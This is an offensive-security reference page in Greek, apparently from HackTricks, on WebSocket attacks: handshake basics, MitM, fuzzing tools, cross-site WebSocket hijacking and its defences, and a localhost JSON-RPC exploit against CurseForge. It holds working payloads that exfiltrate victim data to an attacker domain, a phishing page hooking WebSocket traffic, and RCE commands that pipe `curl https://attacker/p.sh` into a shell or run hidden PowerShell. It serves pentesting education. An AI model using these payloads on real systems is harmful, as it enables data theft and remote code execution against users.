# WebSocket Attacks

{{#include ../banners/hacktricks-training.md}}

## Τι είναι τα WebSockets

Οι συνδέσεις WebSocket δημιουργούνται μέσω ενός αρχικού **HTTP** handshake και είναι σχεδιασμένες να είναι **μακροχρόνιες**, επιτρέποντας αμφίδρομη αποστολή μηνυμάτων οποιαδήποτε στιγμή χωρίς την ανάγκη ενός συναλλακτικού συστήματος. Αυτό κάνει τα WebSockets ιδιαίτερα πλεονεκτικά για εφαρμογές που απαιτούν **χαμηλή καθυστέρηση ή επικοινωνία που ξεκινά από τον διακομιστή**, όπως ροές ζωντανών οικονομικών δεδομένων.

### Εγκαθίδρυση συνδέσεων WebSocket

Μια λεπτομερής εξήγηση για την εγκαθίδρυση συνδέσεων WebSocket είναι διαθέσιμη [**here**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). Εν συντομία, οι συνδέσεις WebSocket συνήθως ξεκινούν μέσω JavaScript από την πλευρά του πελάτη όπως φαίνεται παρακάτω:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
Το πρωτόκολλο `wss` δηλώνει μια σύνδεση WebSocket ασφαλισμένη με **TLS**, ενώ το `ws` υποδηλώνει μια **μη ασφαλή** σύνδεση.

Κατά την εγκαθίδρυση της σύνδεσης, εκτελείται ένα handshake μεταξύ του browser και του server μέσω HTTP. Η διαδικασία του handshake περιλαμβάνει το browser να στέλνει ένα request και το server να απαντά, όπως φαίνεται στα παρακάτω παραδείγματα:

Ο browser στέλνει ένα handshake request:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Απάντηση handshake του Server:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
Η σύνδεση παραμένει ανοιχτή για ανταλλαγή μηνυμάτων και προς τις δύο κατευθύνσεις μόλις καθιερωθεί.

**Κύρια Σημεία του WebSocket Handshake:**

- Οι κεφαλίδες `Connection` και `Upgrade` σηματοδοτούν την έναρξη του WebSocket handshake.
- Η κεφαλίδα `Sec-WebSocket-Version` υποδεικνύει την επιθυμητή έκδοση του WebSocket πρωτοκόλλου, συνήθως `13`.
- Μια τυχαία τιμή κωδικοποιημένη σε Base64 αποστέλλεται στην κεφαλίδα `Sec-WebSocket-Key`, εξασφαλίζοντας ότι κάθε handshake είναι μοναδικό, κάτι που βοηθά στην αποφυγή προβλημάτων με caching proxies. Αυτή η τιμή δεν προορίζεται για authentication αλλά για να επιβεβαιώσει ότι η απάντηση δεν έχει δημιουργηθεί από misconfigured server ή cache.
- Η κεφαλίδα `Sec-WebSocket-Accept` στην απάντηση του server είναι ένα hash του `Sec-WebSocket-Key`, επαληθεύοντας την πρόθεση του server να ανοίξει μια WebSocket σύνδεση.

Αυτά τα χαρακτηριστικά διασφαλίζουν ότι η διαδικασία του handshake είναι ασφαλής και αξιόπιστη, ανοίγοντας τον δρόμο για αποδοτική επικοινωνία σε πραγματικό χρόνο.

### Linux console

Μπορείτε να χρησιμοποιήσετε το `websocat` για να δημιουργήσετε μια raw σύνδεση με ένα websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Ή για να δημιουργήσετε έναν websocat server:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### MitM websocket συνδέσεις

Εάν διαπιστώσετε ότι clients είναι συνδεδεμένοι σε ένα **HTTP websocket** από το τρέχον τοπικό δίκτυό σας μπορείτε να δοκιμάσετε ένα [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing)για να πραγματοποιήσετε μια MitM attack μεταξύ του client και του server.\
Μόλις ο client προσπαθήσει να συνδεθεί σε εσάς μπορείτε στη συνέχεια να χρησιμοποιήσετε:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Websockets enumeration

Μπορείτε να χρησιμοποιήσετε το **tool** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **για να discover, fingerprint και search για known vulnerabilities σε websockets αυτόματα.**

### Websocket Debug tools

- **Burp Suite** υποστηρίζει MitM websockets communication με τρόπο πολύ παρόμοιο με αυτόν που το κάνει για την κανονική HTTP communication.
- Η [**socketsleuth**](https://github.com/snyk/socketsleuth) **Burp Suite extension** θα σας επιτρέψει να διαχειριστείτε καλύτερα Websocket communications στο Burp λαμβάνοντας το **history**, θέτοντας **interception rules**, χρησιμοποιώντας **match and replace** rules, καθώς και **Intruder** και **AutoRepeater.**
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Συντομογραφία του "**WebSocket/Socket.io Proxy**", αυτό το tool, γραμμένο σε Node.js, παρέχει διεπαφή χρήστη για **capture, intercept, send custom** messages και προβολή όλων των WebSocket και Socket.IO communications μεταξύ client και server.
- [**wsrepl**](https://github.com/doyensec/wsrepl) είναι ένα **interactive websocket REPL** σχεδιασμένο ειδικά για penetration testing. Παρέχει διεπαφή για την παρακολούθηση **incoming websocket messages και την αποστολή νέων**, με ένα εύχρηστο framework για **automating** αυτή την επικοινωνία.
- [**https://websocketking.com/**](https://websocketking.com/) είναι ένα web για επικοινωνία με άλλους ιστότοπους χρησιμοποιώντας **websockets**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) μεταξύ άλλων τύπων communications/protocols, παρέχει ένα web για επικοινωνία με άλλους ιστότοπους χρησιμοποιώντας **websockets.**

## Decrypting Websocket

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Websocket Lab

Στο [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) υπάρχει κώδικας για να launch ένα web που χρησιμοποιεί websockets και σε [**this post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) θα βρείτε εξήγηση.

## Websocket Fuzzing

Η burp extension [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner) πλέον επιτρέπει να fuzz επίσης WebSocket messages. Μπορείτε να διαβάσετε περισσότερες πληροφορίες γι' αυτό [**here**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner).

### WebSocket Turbo Intruder (Burp extension)

Το WebSocket Turbo Intruder της PortSwigger φέρνει Turbo Intruder–style Python scripting και high‑rate fuzzing στα WebSockets. Εγκαταστήστε το από το BApp Store ή από το source. Περιλαμβάνει δύο components:

- Turbo Intruder: high‑volume messaging προς ένα μόνο WS endpoint χρησιμοποιώντας custom engines.
- HTTP Middleware: εκθέτει ένα τοπικό HTTP endpoint που προωθεί bodies ως WS messages πάνω από μια persistent σύνδεση, ώστε οποιοσδήποτε HTTP‑based scanner να μπορεί να probe WS backends.

Βασικό πρότυπο script για να fuzz ένα WS endpoint και να φιλτράρετε σχετικές απαντήσεις:
```python
def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(upgrade_request)
for i in range(10):
connection.queue(message, str(i))

def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@MatchRegex(r'{\"user\":\"Hal Pline\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Χρησιμοποιήστε decorators όπως `@MatchRegex(...)` για να μειώσετε τον θόρυβο όταν ένα μόνο μήνυμα προκαλεί πολλαπλές αποκρίσεις.

### Γέφυρα WS πίσω από HTTP (HTTP Middleware)

Τυλίξτε μια επίμονη WS σύνδεση και προωθήστε τα σώματα HTTP ως μηνύματα WS για αυτοματοποιημένες δοκιμές με HTTP scanners:
```python
def create_connection(upgrade_request):
connection = websocket_connection.create(upgrade_request)
return connection

@MatchRegex(r'{\"user\":\"You\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Στη συνέχεια στείλε HTTP τοπικά· το σώμα προωθείται ως μήνυμα WS:
```http
POST /proxy?url=https%3A%2F%2Ftarget/ws HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 16

{"message":"hi"}
```
Αυτό σας επιτρέπει να ελέγχετε backends WS ενώ φιλτράρετε για «ενδιαφέρουσες» events (π.χ., SQLi errors, auth bypass, command injection behavior).

### Socket.IO διαχείριση (handshake, heartbeats, events)

Το Socket.IO προσθέτει το δικό του framing πάνω από το WS. Εντοπίστε το μέσω του υποχρεωτικού query parameter `EIO` (π.χ., `EIO=4`). Διατηρήστε τη συνεδρία ενεργή με Ping (`2`) και Pong (`3`) και ξεκινήστε τη συνομιλία με `"40"`, στη συνέχεια εκπέμψτε events όπως `42["message","hello"]`.

Παράδειγμα Intruder:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.queue('42["message","hello"]')

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Παραλλαγή προσαρμογέα HTTP:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def create_connection(upgrade_request):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.decIn()
return connection

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
### Ανίχνευση prototype pollution από την πλευρά του διακομιστή μέσω Socket.IO

Ακολουθώντας την ασφαλή τεχνική ανίχνευσης του PortSwigger, δοκιμάστε να μολύνετε τα Express internals στέλνοντας ένα payload όπως:
```json
{"__proto__":{"initialPacket":"Polluted"}}
```
Αν τα greetings ή η συμπεριφορά αλλάζουν (π.χ., το echo περιλαμβάνει "Polluted"), πιθανότατα μόλυνες τα server-side prototypes. Η επίδραση εξαρτάται από τα reachable sinks· συσχετίστε με τα gadgets στην ενότητα Node.js prototype pollution. Δείτε:

- Check [NodeJS – __proto__ & prototype Pollution](deserialization/nodejs-proto-prototype-pollution/README.md) for sinks/gadgets and chaining ideas.

### WebSocket race conditions with Turbo Intruder

Η default engine ομαδοποιεί μηνύματα σε μία σύνδεση (great throughput, poor for races). Χρησιμοποιήστε την THREADED engine για να ανοίξετε πολλαπλές WS συνδέσεις και να στείλετε payloads παράλληλα ώστε να προκαλέσετε logic races (double‑spend, token reuse, state desync). Ξεκινήστε από το example script και ρυθμίστε την concurrency στο `config()`.

- Learn methodology and alternatives in [Race Condition](race-condition.md) (see “RC in WebSockets”).

### WebSocket DoS: malformed frame “Ping of Death”

Κατασκευάστε WS frames των οποίων το header δηλώνει τεράστιο payload length αλλά δεν στέλνετε body. Κάποιοι WS servers εμπιστεύονται το length και προχωρούν σε pre‑allocation buffers· το να το ορίσετε κοντά στο `Integer.MAX_VALUE` μπορεί να προκαλέσει Out‑Of‑Memory και remote unauth DoS. Δείτε το example script.

### CLI and debugging

- Headless fuzzing: `java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>`
- Ενεργοποιήστε τον WS Logger για να καταγράψετε και να συσχετίσετε μηνύματα χρησιμοποιώντας internal IDs.
- Χρησιμοποιήστε τους helpers `inc*`/`dec*` στο `Connection` για να ρυθμίσετε το message ID handling σε πολύπλοκους adapters.
- Decorators όπως `@PingPong`/`@Pong` και helpers όπως `isInteresting()` μειώνουν το θόρυβο και κρατούν τις sessions ζωντανές.

### Operational safety

Το high‑rate WS fuzzing μπορεί να ανοίξει πολλές συνδέσεις και να στείλει χιλιάδες μηνύματα ανά δευτερόλεπτο. Malformed frames και υψηλοί ρυθμοί μπορεί να προκαλέσουν πραγματικό DoS. Χρησιμοποιήστε μόνο όπου επιτρέπεται.

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**, also known as **cross-origin WebSocket hijacking**, αναγνωρίζεται ως ειδική περίπτωση του **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** που επηρεάζει τα WebSocket handshakes. Αυτή η ευπάθεια προκύπτει όταν τα WebSocket handshakes αυθεντικοποιούν αποκλειστικά μέσω **HTTP cookies** χωρίς **CSRF tokens** ή παρόμοια μέτρα ασφαλείας.

Οι επιτιθέμενοι μπορούν να το εκμεταλλευτούν φιλοξενώντας μια **κακόβουλη web page** που ξεκινά μια cross-site WebSocket σύνδεση προς μια ευάλωτη εφαρμογή. Κατά συνέπεια, αυτή η σύνδεση θεωρείται μέρος της συνεδρίας του θύματος με την εφαρμογή, εκμεταλλευόμενη την έλλειψη CSRF προστασίας στον μηχανισμό διαχείρισης συνεδριών.

Για να λειτουργήσει αυτή η επίθεση, απαιτούνται τα εξής:

- Η websocket **authentication πρέπει να είναι cookie based**
- Το cookie πρέπει να είναι προσβάσιμο από τον attacker server (αυτό συνήθως σημαίνει **`SameSite=None`**) και να μην είναι ενεργοποιημένο το **Firefox Total Cookie Protection** στο Firefox και να μην υπάρχουν **blocked third-party cookies** στο Chrome.
- Ο websocket server δεν πρέπει να ελέγχει το origin της σύνδεσης (ή αυτό πρέπει να είναι δυνατόν να παρακαμφθεί)

Επίσης:

- Αν η authentication βασίζεται σε local connection (σε localhost ή σε τοπικό δίκτυο) η επίθεση **θα είναι δυνατή** καθώς δεν υπάρχει τρέχουσα προστασία που να το εμποδίζει (Δείτε [more info here](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/))

### Απλή επίθεση

Σημειώστε ότι όταν γίνεται **εγκαθίδρυση** μιας **websocket** σύνδεσης, το **cookie** **αποστέλλεται** στον **server**. Ο **server** μπορεί να το χρησιμοποιεί για να **συνδέσει** κάθε **συγκεκριμένο** **user** με τη **websocket** **session** του βάσει του αποσταλμένου cookie.

Αν, για **παράδειγμα**, ο **websocket** **server** **επιστρέφει το ιστορικό της συνομιλίας** ενός χρήστη εάν ένα μήνυμα με "**READY**" σταλεί, τότε ένα **απλό XSS** που εγκαθιδρύει τη σύνδεση (το **cookie** θα **αποσταλεί** **αυτόματα** για να εξουσιοδοτήσει τον χρήστη-θύμα) **στέλνοντας** "**READY**" θα μπορεί να **ανακτήσει** το ιστορικό της **συνομιλίας**.:
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie με διαφορετικό subdomain

Στο blog post [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) ο επιτιθέμενος κατάφερε να **εκτελέσει αυθαίρετο Javascript σε ένα subdomain** του domain όπου γινόταν η web socket επικοινωνία. Επειδή ήταν ένα **subdomain**, το **cookie** αποστέλλονταν, και επειδή ο **Websocket δεν έλεγχε σωστά το Origin**, ήταν δυνατό να επικοινωνήσει μαζί του και να **κλέψει tokens από αυτό**.

### Κλοπή δεδομένων από τον χρήστη

Αντιγράψτε την εφαρμογή web που θέλετε να προσποιηθείτε (τα .html αρχεία για παράδειγμα) και μέσα στο script όπου γίνεται η websocket επικοινωνία προσθέστε αυτόν τον κώδικα:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Τώρα κατέβασε το αρχείο `wsHook.js` από [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) και **αποθήκευσέ το μέσα στον φάκελο με τα web αρχεία**.\
Εκθέτοντας την web εφαρμογή και κάνοντας έναν χρήστη να συνδεθεί σε αυτή, θα μπορείς να κλέψεις τα αποσταλμένα και ληφθέντα μηνύματα μέσω websocket:
```javascript
sudo python3 -m http.server 80
```
### CSWSH Προστασίες

Η επίθεση CSWSH βασίζεται στο γεγονός ότι ένας χρήστης θα συνδεθεί σε μια κακόβουλη σελίδα που θα ανοίξει μια websocket σύνδεση σε μια ιστοσελίδα όπου ο χρήστης είναι ήδη συνδεδεμένος και θα αυθεντικοποιηθεί ως αυτός, καθώς το αίτημα θα στείλει τα cookies του χρήστη.

Σήμερα, είναι πολύ εύκολο να προληφθεί αυτό το ζήτημα:

- **Websocket server checking the origin**: Ο websocket server πρέπει πάντα να ελέγχει από πού συνδέεται ένας χρήστης για να αποτρέψει απρόσμενες σελίδες από το να συνδεθούν σε αυτόν.
- **Authentication token**: Αντί να βασίζεται η αυθεντικοποίηση σε cookie, η websocket σύνδεση θα μπορούσε να βασίζεται σε ένα token που παράγεται από τον server για τον χρήστη και είναι άγνωστο στον attacker (όπως ένα anti-CSRF token).
- **SameSite Cookie attribute**: Cookies με `SameSite` value as `Lax` or `Strict` δεν θα αποστέλλονται από μια εξωτερική σελίδα attacker στον server του θύματος, επομένως η αυθεντικοποίηση που βασίζεται σε cookie δεν θα είναι επιτυχής. Σημειώστε ότι το Chrome πλέον βάζει την τιμή **`Lax`** στα cookies χωρίς αυτή τη σημαία, κάνοντας αυτό πιο ασφαλές από προεπιλογή. Ωστόσο, για τα πρώτα 2 λεπτά από τη δημιουργία ενός cookie θα έχει την τιμή **`None`**, κάνοντάς το ευάλωτο κατά τη διάρκεια αυτού του περιορισμένου χρονικού διαστήματος (επιπλέον αναμένεται ότι αυτό το μέτρο θα αφαιρεθεί κάποια στιγμή).
- **Firefox Total Cookie Protection**: Το Total Cookie Protection του Firefox λειτουργεί απομονώνοντας τα cookies στον ιστότοπο στον οποίο δημιουργούνται. Ουσιαστικά κάθε site έχει το δικό του partition αποθήκευσης cookies για να αποτρέψει τρίτους από το να συνδέσουν το ιστορικό περιήγησης ενός χρήστη. Αυτό καθιστά το **CSWSH unusable** καθώς η σελίδα του attacker δεν θα έχει πρόσβαση στα cookies.
- **Chrome third-party cookies block**: Αυτό μπορεί επίσης να αποτρέψει την αποστολή του cookie του αυθεντικοποιημένου χρήστη στον websocket server ακόμα και με `SameSite=None`.

### Κατάχρηση Localhost WebSocket & ανακάλυψη port από browser

Οι desktop launchers συχνά εκκινούν helpers (π.χ. CurseForge's `CurseAgent.exe`) που εκθέτουν JSON-RPC WebSockets στο `127.0.0.1:<random_port>`. Το browser **does not enforce SOP on loopback sockets**, οπότε οποιαδήποτε Web σελίδα μπορεί να επιχειρήσει το handshake. Αν ο agent αποδέχεται αυθαίρετες τιμές `Origin` και παραλείπει δευτερεύουσα αυθεντικοποίηση, το IPC surface γίνεται απομακρυσμένα ελεγχόμενο απευθείας από JavaScript.

#### Καταγραφή εκτεθειμένων μεθόδων

Καταγράψτε μια νόμιμη συνεδρία για να μάθετε το συμβόλαιο του πρωτοκόλλου. CurseForge, για παράδειγμα, εκπέμπει frames όπως `{"type":"method","name":"minecraftTaskLaunchInstance","args":[{...}]}` όπου `name` είναι η RPC μέθοδος και `args` περιέχει δομημένα αντικείμενα (GUIDs, resolution, flags, κλπ.). Μόλις αυτή η μορφή γίνει γνωστή μπορείτε να καλέσετε μεθόδους όπως `createModpack`, `minecraftGetDefaultLocation`, ή οποιαδήποτε άλλη privileged task απευθείας από μια injected σελίδα.

#### Ανακάλυψη port μέσω browser

Επειδή ο helper δεσμεύεται σε ένα τυχαίο υψηλό port, το exploit πρώτα κάνει brute-force στο localhost μέσω WebSockets. Τα Chromium-based browsers ανεχθούν ~16k αποτυχημένων upgrades πριν από throttling, που είναι αρκετό για να διασχίσει το ephemeral range· ο Firefox τείνει να καταρρέει ή να παγώνει μετά από μερικές εκατοντάδες αποτυχίες, οπότε πρακτικά PoC συχνά στοχεύουν Chromium.

<details>
<summary>Ελάχιστος browser scanner</summary>
```javascript
async function findLocalWs(start = 20000, end = 36000) {
for (let port = start; port <= end; port++) {
await new Promise((resolve) => {
const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
let settled = false;
const finish = () => { if (!settled) { settled = true; resolve(); } };
ws.onerror = ws.onclose = finish;
ws.onopen = () => {
console.log(`Found candidate on ${port}`);
ws.close();
finish();
};
});
}
}
```
</details>

Μόλις μια σύνδεση επιβιώσει το handshake και επιστρέψει δεδομένα ειδικά του πρωτοκόλλου, επαναχρησιμοποιήστε αυτό το socket για την αλυσίδα RPC.

#### Σύνδεση μεθόδων JSON-RPC για RCE

Το CurseForge exploit αλυσιδώνει δύο μη αυθεντικοποιημένες κλήσεις:

1. `createModpack` → επιστρέφει ένα νέο `MinecraftInstanceGuid` χωρίς αλληλεπίδραση χρήστη.
2. `minecraftTaskLaunchInstance` → εκκινεί αυτό το GUID ενώ δέχεται αυθαίρετα JVM flags μέσω `AdditionalJavaArguments`.

Οι επιλογές διάγνωσης JNI/JVM παρέχουν τότε ένα έτοιμο προς χρήση RCE primitive. Για παράδειγμα, περιορίστε το metaspace για να αναγκάσετε ένα crash και εκμεταλλευτείτε το error hook για εκτέλεση εντολών:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```
Σε Unix targets απλώς αντικαταστήστε το payload με `/bin/sh -c 'curl https://attacker/p.sh | sh'`. Αυτό λειτουργεί ακόμα και όταν δεν μπορείτε να πειράξετε τον κώδικα της εφαρμογής — ο έλεγχος του JVM CLI είναι αρκετός.

Αυτό το μοτίβο “create resource → privileged launch” εμφανίζεται συχνά σε updaters και launchers. Κάθε φορά που η μέθοδος (1) επιστρέφει έναν server-tracked identifier και η μέθοδος (2) εκτελεί κώδικα ή δημιουργεί μια διεργασία με αυτόν τον identifier, ελέγξτε αν μπορούν να εγχυθούν user-controlled arguments.


## Race Conditions

Race Conditions in WebSockets are also a thing, [ελέγξτε αυτές τις πληροφορίες για να μάθετε περισσότερα](race-condition.md#rc-in-websockets).

## Άλλες ευπάθειες

Καθώς τα Web Sockets είναι μηχανισμός για την **αποστολή δεδομένων στο server side και στο client side**, ανάλογα με το πώς ο server και ο client χειρίζονται τις πληροφορίες, **τα Web Sockets μπορούν να χρησιμοποιηθούν για την εκμετάλλευση πολλών άλλων ευπαθειών όπως XSS, SQLi ή οποιασδήποτε άλλης κοινής web vuln χρησιμοποιώντας είσοδο χρήστη από ένα websocket.**

## **WebSocket Smuggling**

Αυτή η ευπάθεια θα μπορούσε να σας επιτρέψει να **bypass reverse proxies restrictions** κάνοντάς τους να πιστέψουν ότι μια **websocket communication was stablished** (ακόμα κι αν δεν ισχύει). Αυτό θα μπορούσε να επιτρέψει σε έναν attacker να **access hidden endpoints**. Για περισσότερες πληροφορίες ελέγξτε την παρακάτω σελίδα:


{{#ref}}
h2c-smuggling.md
{{#endref}}

## Αναφορές

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocket Turbo Intruder – BApp Store](https://portswigger.net/bappstore/ba292c5982ea426c95c9d7325d9a1066)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [Turbo Intruder background](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [Server-side prototype pollution – safe detection methods](https://portswigger.net/research/server-side-prototype-pollution#safe-detection-methods-for-manual-testers)
- [WS RaceCondition PoC (Java)](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [PingOfDeathExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/PingOfDeathExample.py)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
